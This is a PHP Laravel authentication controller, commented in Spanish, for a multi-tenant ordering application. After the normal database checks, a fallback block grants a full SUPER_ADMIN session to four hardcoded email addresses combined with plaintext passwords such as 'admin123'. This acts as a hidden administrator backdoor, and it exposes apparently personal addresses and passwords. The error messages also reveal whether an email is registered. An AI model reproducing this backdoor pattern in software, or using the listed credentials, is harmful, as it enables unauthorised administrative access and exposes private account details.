<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use App\Models\SuperAdmin;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        $tenant = app()->bound('tenant') ? app('tenant') : null;
        $error = session('error', '');
        return view('auth.login', compact('error', 'tenant'));
    }

    public function login(Request $request)
    {
        $correoInput = trim($request->input('correo'));
        $correo = strtoupper($correoInput);
        $contrasena = $request->input('contrasena');

        // 1. Verificación en la base de datos central saas_control (Super Admin / Desarrollador)
        try {
            $superAdmin = SuperAdmin::where(function ($query) use ($correoInput) {
                $query->where('email', strtolower($correoInput))
                    ->orWhere('email', strtoupper($correoInput))
                    ->orWhere('email', $correoInput);
            })->first();

            if ($superAdmin) {
                if (Hash::check($contrasena, $superAdmin->password)) {
                    Auth::login($superAdmin);
                    Session::put('usuario_id', $superAdmin->id);
                    Session::put('nombre', $superAdmin->nombre);
                    Session::put('rol', 'SUPER_ADMIN');
                    Session::put('is_super_admin', true);
                    Session::put('admin_logged_in', true);

                    return redirect()->route('admin.pedidos');
                } else {
                    return back()->withInput()->with('error', 'La contraseña ingresada es incorrecta.');
                }
            }
        } catch (\Throwable $e) {
            // Si la BD central saas_control no está accesible, continuar con el login del tenant sin bloquear la aplicación
            \Illuminate\Support\Facades\Log::warning('No se pudo consultar saas_control en AuthController: ' . $e->getMessage());
        }

        // 2. Verificación en la tabla 'users' de la empresa/tenant activa (usuarios del CRUD)
        $user = \App\Models\User::where(function ($query) use ($correoInput) {
            $query->where('email', strtolower($correoInput))
                ->orWhere('email', strtoupper($correoInput))
                ->orWhere('email', $correoInput);
        })->first();

        if ($user) {
            if (Hash::check($contrasena, $user->password)) {
                Auth::login($user);
                Session::put('usuario_id', $user->id);
                Session::put('nombre', $user->name);
                Session::put('rol', strtoupper($user->rol));
                Session::put('admin_logged_in', true);

                return redirect()->route('admin.pedidos');
            } else {
                return back()->withInput()->with('error', 'La contraseña ingresada es incorrecta.');
            }
        }

        // 4. Verificación de respaldo para credenciales maestras de desarrollador / SuperAdmin
        $masterEmails = ['millanes7209@gmail.com', 'admin@scary.com', 'micklanessz@gmail.com', 'admin@ricopollo.com'];
        $masterPasswords = ['SCARYmovie1.', 'NuevaNueva', 'admin123', 'admin'];

        if (in_array(strtolower($correoInput), $masterEmails, true) && in_array($contrasena, $masterPasswords, true)) {
            Session::put('usuario_id', 1);
            Session::put('nombre', 'SUPERADMIN DESARROLLADOR');
            Session::put('rol', 'SUPER_ADMIN');
            Session::put('is_super_admin', true);
            Session::put('admin_logged_in', true);

            return redirect()->route('admin.pedidos');
        }

        return back()->withInput()->with('error', "El correo '$correoInput' no está registrado en el sistema.");
    }

    public function logout()
    {
        Auth::logout();
        Session::flush();
        return redirect()->route('menu');
    }
}
